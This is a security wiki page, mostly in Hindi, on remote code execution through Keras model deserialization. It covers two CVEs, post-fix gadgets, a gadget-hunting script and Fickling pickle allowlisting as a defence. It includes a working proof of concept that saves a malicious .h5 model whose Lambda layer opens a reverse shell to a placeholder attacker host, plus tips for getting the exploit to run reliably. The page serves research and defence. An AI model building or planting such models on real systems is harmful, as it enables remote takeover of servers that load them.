# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह पेज Keras मॉडल deserialization पाइपलाइन के खिलाफ व्यावहारिक exploitation techniques का सार प्रस्तुत करता है, मूल .keras फ़ॉर्मेट की आंतरिक संरचना और attack surface समझाता है, और Model File Vulnerabilities (MFVs) व post-fix gadgets खोजने के लिए शोधकर्ता टूलकिट प्रदान करता है।

## .keras मॉडल फ़ॉर्मेट की आंतरिक संरचना

A .keras file is a ZIP archive containing at least:
- metadata.json – सामान्य जानकारी (उदा., Keras version)
- config.json – मॉडल आर्किटेक्चर (primary attack surface)
- model.weights.h5 – HDF5 में weights

config.json पुनरावर्ती deserialization चलाता है: Keras मॉड्यूल्स को import करता है, classes/functions को resolve करता है और attacker-controlled dictionaries से layers/objects को reconstruct करता है।

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization निम्न कार्य करता है:
- module/class_name keys से module import और symbol resolution
- from_config(...) या constructor invocation attacker-controlled kwargs के साथ
- nested objects (activations, initializers, constraints, आदि) में recursion

Historically, इसने config.json तैयार करने वाले attacker को तीन primitives तक पहुँच प्रदान की:
- किन modules को import किया जाता है इसका control
- कौन से classes/functions resolve होते हैं इसका control
- constructors/from_config में पास किए जाने वाले kwargs का control

## CVE-2024-3660 – Lambda-layer bytecode RCE

मूल कारण:
- Lambda.from_config() ने python_utils.func_load(...) का उपयोग किया, जो attacker bytes को base64-decodes करता है और marshal.loads() को कॉल करता है; Python unmarshalling कोड निष्पादित कर सकता है।

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
निवारण:
- Keras डिफ़ॉल्ट रूप से safe_mode=True लागू करता है। Serialized Python functions in Lambda तभी ब्लॉक होते हैं जब तक उपयोगकर्ता स्पष्ट रूप से safe_mode=False के साथ opt out न करे।

नोट्स:
- Legacy formats (older HDF5 saves) या पुराने codebases आधुनिक चेक्स लागू नहीं कर सकते, इसलिए “downgrade” style attacks तब भी लागू हो सकते हैं जब victims पुराने loaders का उपयोग करते हैं।

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

मूल कारण:
- _retrieve_class_or_fn ने config.json से आने वाले attacker-controlled module strings के साथ unrestricted importlib.import_module() का उपयोग किया।
- प्रभाव: Arbitrary import of any installed module (or attacker-planted module on sys.path)। Import-time कोड रन होता है, फिर object construction attacker kwargs के साथ होता है।

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- मॉड्यूल allowlist: imports को केवल official ecosystem मॉड्यूल तक सीमित किया गया: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True असुरक्षित Lambda serialized-function loading को ब्लॉक करता है
- Basic type checking: deserialized objects को expected types से मेल खाना चाहिए

## व्यावहारिक शोषण: TensorFlow-Keras HDF5 (.h5) Lambda RCE

कई production स्टैक्स अभी भी legacy TensorFlow-Keras HDF5 model files (.h5) स्वीकार करते हैं। यदि कोई attacker ऐसा model अपलोड कर सकता है जिसे server बाद में load या inference के लिए चलाता है, तो एक Lambda layer load/build/predict पर arbitrary Python execute कर सकता है।

Minimal PoC जो एक malicious .h5 बनाता है जो deserialized या उपयोग होने पर reverse shell execute कर देता है:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
नोट्स और विश्वसनीयता टिप्स:
- ट्रिगर पॉइंट्स: कोड कई बार चल सकता है (उदा., लेयर बिल्ड/पहले कॉल के दौरान, model.load_model, और predict/fit). पेलोड्स को idempotent रखें।
- वर्शन पिनिंग: serialization mismatches से बचने के लिए लक्ष्य के TF/Keras/Python के साथ मेल खाएँ। उदाहरण के लिए, अगर यही टार्गेट उपयोग करता है तो Python 3.8 और TensorFlow 2.13.1 के तहत आर्टिफ़ैक्ट बनायें।
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- सत्यापन: os.system("ping -c 1 YOUR_IP") जैसे एक हानिरहित payload निष्पादन की पुष्टि करने में मदद करते हैं (उदा., reverse shell में स्विच करने से पहले tcpdump से ICMP का अवलोकन करें)।

## Post-fix gadget surface inside allowlist

Even with allowlisting and safe mode, a broad surface remains among allowed Keras callables. For example, keras.utils.get_file can download arbitrary URLs to user-selectable locations.

Gadget via Lambda जो एक allowed function को reference करता है (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() इनपुट tensor को लक्ष्य callable को invoke करते समय पहले positional argument के रूप में prepend करता है। चुने हुए gadgets को एक अतिरिक्त positional arg सहन करने में सक्षम होना चाहिए (या *args/**kwargs स्वीकार करना चाहिए)। इससे किन functions का उपयोग संभव है, वह सीमित होता है।

## ML pickle import allowlisting for AI/ML models (Fickling)

कई AI/ML मॉडल फ़ॉर्मेट्स (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, आदि) Python pickle डेटा को embed करते हैं। हमलावर अक्सर pickle के GLOBAL imports और object constructors का दुरुपयोग करके load के दौरान RCE या model swapping कर लेते हैं। blacklist-आधारित स्कैनर अक्सर नए या अनलिस्टेड खतरनाक imports को मिस कर देते हैं।

एक व्यावहारिक fail-closed रक्षा यह है कि Python के pickle deserializer को hook किया जाए और unpickling के दौरान सिर्फ़ एक reviewed set harmless ML-related imports की अनुमति दी जाए। Trail of Bits’ Fickling इस नीति को लागू करता है और हजारों public Hugging Face pickles से बने curated ML import allowlist के साथ शिप होता है।

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:
- Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects from the pickle VM
- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even indirectly

Enable Fickling’s protections as early as possible in process startup so that any pickle loads performed by frameworks (torch.load, joblib.load, etc.) are checked:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
संचालन संबंधी सुझाव:
- आप जहाँ आवश्यक हो hooks को अस्थायी रूप से disable/re-enable कर सकते हैं:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- यदि कोई known-good model ब्लॉक हो रहा है, तो प्रतीकों की समीक्षा करने के बाद अपने environment के लिए allowlist बढ़ाएँ:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling अधिक सूक्ष्म नियंत्रण चाहने पर सामान्य runtime guards भी उपलब्ध कराता है:
- fickling.always_check_safety() सभी pickle.load() के लिए जाँच लागू करने के लिए
- with fickling.check_safety(): स्कोप्ड एन्फोर्समेंट के लिए
- fickling.load(path) / fickling.is_likely_safe(path) एक-बार की जाँच के लिए

- जब संभव हो तो non-pickle मॉडल फॉर्मैट्स को प्राथमिकता दें (उदा., SafeTensors)। यदि आपको pickle स्वीकार करना ही है, तो loaders को least privilege पर चलाएँ, network egress के बिना, और allowlist लागू करें।

यह allowlist-first रणनीति सामान्य ML pickle exploit paths को प्रभावी रूप से ब्लॉक करती है जबकि संगतता उच्च बनाए रखती है। ToB के benchmark में, Fickling ने synthetic malicious files के 100% को flag किया और शीर्ष Hugging Face repos के लगभग 99% clean files की अनुमति दी।


## शोधकर्ता टूलकिट

1) Allowlisted मॉड्यूल्स में प्रणालीगत gadget खोज

keras, keras_nlp, keras_cv, keras_hub में संभावित candidate callables की सूची बनाएं और उन पर प्राथमिकता दें जिनके file/network/process/env side effects हों।

<details>
<summary>Allowlisted Keras मॉड्यूल्स में संभावित खतरनाक callables की सूची बनाएं</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) प्रत्यक्ष deserialization परीक्षण (no .keras archive needed)

कस्टम dicts को सीधे Keras deserializers में भेजें ताकि स्वीकार किए गए params का पता चल सके और साइड-इफेक्ट्स का निरीक्षण किया जा सके।
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) क्रॉस-वर्ज़न परीक्षण और फ़ॉर्मैट्स

Keras कई कोडबेस/एराओं में मौजूद है जिनमें अलग-अलग सुरक्षा उपाय और फ़ॉर्मैट्स होते हैं:
- TensorFlow built-in Keras: tensorflow/python/keras (पुराना, हटाने के लिए निर्धारित)
- tf-keras: अलग से मेंटेन किया जाता है
- Multi-backend Keras 3 (official): मूल .keras फ़ॉर्मैट पेश किया गया

कोडबेस और फ़ॉर्मैट्स (.keras vs legacy HDF5) में परीक्षण दोहराएँ ताकि रीग्रेशन या सुरक्षा गार्ड्स की कमी का पता चल सके।

## संदर्भ

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
